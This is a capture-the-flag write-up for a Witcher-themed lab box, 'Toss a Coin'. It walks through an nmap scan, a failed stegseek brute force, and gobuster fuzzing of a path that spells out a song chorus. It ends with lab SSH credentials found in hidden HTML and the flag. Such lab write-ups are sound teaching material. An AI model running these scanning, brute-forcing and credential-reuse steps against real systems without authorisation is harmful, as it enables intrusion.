# Write-up : "Toss a Coin"

**Target:** 10.10.0.15

**Objective:** Retrieve user.txt

**Difficulty:** Easy

**Date:** 18/09/2026

**Techniques used:** Network reconnaissance, steganography (ruled out lead), recursive directory fuzzing, HTML source code analysis

**Tools used:** nmap, curl, exiftool, strings, binwalk, steghide, stegseek, gobuster, ssh

---

## 1. Initial reconnaissance

### 1.1 Port scan

```bash
nmap -sC -sV -oN scan_initial.txt 10.10.0.15
```

**Result:**

| Port   | Service | Version                    |
| ------ | ------- | -------------------------- |
| 22/tcp | SSH     | OpenSSH 10.0p2 (Debian 13) |
| 80/tcp | HTTP    | Apache 2.4.68 (Debian)     |

The web page's title (`http-title`) is "Toss a coin to your witcher", a direct reference to the song of the same name from the Netflix series _The Witcher_, performed by the character Jaskier. The challenge's name and this hint immediately give the thematic lead to follow.

### 1.2 Home page

```bash
curl -s http://10.10.0.15/
```

To see the response headers (hints are often hidden there).

The page contains:

- A link to `/main.css`
- An image `/img/jaskier.jpg`
- A hint text: _"Don't fight it, you know you want to sing it, it might even help you out."_

→ Clear message: you literally have to "sing" / know the song's lyrics to progress.

---

## 2. False leads explored

Before finding the right path, several classic CTF hypotheses were tested and ruled out.

### 2.1 Steganography on the image

```bash
exiftool jaskier.jpg
strings jaskier.jpg | tail -50
binwalk jaskier.jpg
steghide info jaskier.jpg
```

`steghide` detected a JPEG format compatible with hiding capacity (~5 KB), suggesting a possible passphrase-protected hidden data.

**Tools used for brute forcing:**

- Installing `stegseek` (via GitHub `.deb`, since the Debian repos had a libc6/libstdc++6 dependency conflict):

```bash
wget https://github.com/RickdeJager/stegseek/releases/download/v0.6/stegseek_0.6-1.deb
dpkg -i stegseek_0.6-1.deb
```

- Brute force with rockyou.txt:

```bash
stegseek jaskier.jpg /usr/share/wordlists/rockyou.txt
```

- Custom wordlist based on the song's themes (keywords, no full lyrics reproduced).

**Result:** no valid passphrase found. This lead was abandoned -> the image did not contain exploitable steganographic data (or not with this method).

**Lesson:** don't stubbornly stick to a lead if the dedicated tools (stegseek with rockyou) don't produce anything quickly; explore the other attack surfaces in parallel.

---

## 3. The real vulnerability: "spelled out" recursive fuzzing

### 3.1 Discovering the /t/ folder

```bash
gobuster dir -u http://10.10.0.15/ -w /opt/lists/seclists/Discovery/Web-Content/common.txt -x php,txt,html,zip,bak -t 50
```

**Notable result:**

```
img (Status: 301) --> /img/
t   (Status: 301) --> /t/
```

The `/img/` folder was already known. The `/t/` folder is the real lead.

### 3.2 Content of /t/

```bash
curl -s http://10.10.0.15/t/
```

**Message displayed:** _"Do you know the lyrics? this one is pretty famous!"_

-> Confirmation: the server path encodes the song letter by letter.

### 3.3 Principle of the vulnerability

The server exposes a directory tree where each character of the key phrase (the song's chorus) becomes a single-letter subfolder, and the spaces between words are encoded by underscores (`_`) acting as separators. We had to fuzz level by level to reconstruct the full path, character by character.

### 3.4 Discovery methodology

For each discovered directory level, the same loop was repeated:

```bash
# 1. See the content of the current folder
curl -s http://10.10.0.15/<current_path>/

# 2. Fuzz to find the next character/segment
gobuster dir -u http://10.10.0.15/<current_path>/ \
  -w /opt/lists/seclists/Discovery/Web-Content/common.txt \
  -x php,txt,html,zip,bak -t 50
```

`-t 50` = just the number of threads (parallel requests) gobuster will use. If nothing is set, gobuster uses 10 by default.

Each gobuster run revealed a new subfolder (status 301) corresponding to the next letter, progressively revealing the path:

```
/t/o/s/s/_/a/_/c/o/i/n/_/t/o/_/y/o/u/r/_/w/i/t/c/h/e/r/_/o/h/_/v/a/l/l/e/y/_/o/f/_/p/l/e/n/t/y/
```

This path spells out, letter by letter and word by word (separated by `_`), the key phrase from the song's chorus (without the apostrophe character, replaced here by "oh").

### 3.5 The final page

```bash
curl -s "http://10.10.0.15/t/o/s/s/_/a/_/c/o/i/n/_/t/o/_/y/o/u/r/_/w/i/t/c/h/e/r/_/o/h/_/v/a/l/l/e/y/_/o/f/_/p/l/e/n/t/y/"
```

This page (`index.html` size: 371 bytes, versus 226 on all previous "generic" pages) contained:

- A validation message: _"So you DO know the lyrics. Well, good for you!"_
- A second image: `/img/jaskier2.jpg`
- Credentials hidden in a hidden HTML element (`style="display: none;"`):

```
jaskier:YouHaveTheMostIncredibleNeckItsLikeASexyGoose
```

**Vulnerability exploited here:** disclosure of sensitive information (credentials) in the HTML source code, visually hidden via CSS (`display: none`) but fully visible in the raw source code / HTTP response.

---

## 4. SSH access

With the credentials found:

```bash
ssh jaskier@10.10.0.15
# Password: YouHaveTheMostIncredibleNeckItsLikeASexyGoose
```

Successful connection to `the_continent` (Linux, kernel 6.8.0-136-generic Ubuntu).

### Retrieving the flag

```bash
cat ~/user.txt
```

**Result obtained:**

```
EPI{R3Sp3C7_D03sNT_M4k3_h1S70rY}
```

---

## 5. Summary of the attack chain

| Step | Action                             | Result                                       |
| ----- | ----------------------------------- | --------------------------------------------- |
| 1     | Nmap scan                          | Ports 22 (SSH) and 80 (HTTP) open            |
| 2     | Web page analysis                  | Thematic hint "song to sing"                  |
| 3     | Steganography (false lead)         | No hidden data found in the image            |
| 4     | Gobuster on /                      | Discovery of the `/t/` folder                |
| 5     | Recursive letter-by-letter fuzzing | Reconstruction of the path spelling the chorus |
| 6     | Final page                         | Credentials hidden in HTML (`display: none`) |
| 7     | SSH with the credentials           | Shell access obtained                        |
| 8     | `cat user.txt`                     | Flag retrieved                               |

---

## Summary of the exploited vulnerability

| #   | Vulnerability                                                                   | Type / Category                             | Short explanation                                                                                                                       |
| --- | --------------------------------------------------------------------------------- | --------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------- |
| 1   | Credentials exposed in the HTML, hidden only via CSS (`display: none`)            | Exposure of Sensitive Information (CWE-200) | A purely visual client-side "security" measure has no effect server-side: the credentials remain readable in the raw source code.       |

---

## Conclusion

- **Initial access:** OSINT/narrative enumeration (page hints) -> recursive directory fuzzing spelling out a song's lyrics -> discovery of credentials hidden in HTML.
- **User flag:** obtained in `~/user.txt` after SSH login as the `jaskier` user.

---

## Evidences

### File / Toss A Coin

![File / Toss A Coin](Evidences/File%20Toss%20a%20coin.png)

### Hidden file

![Hidden file](Evidences/Flag%20Toss%20a%20coin.png)
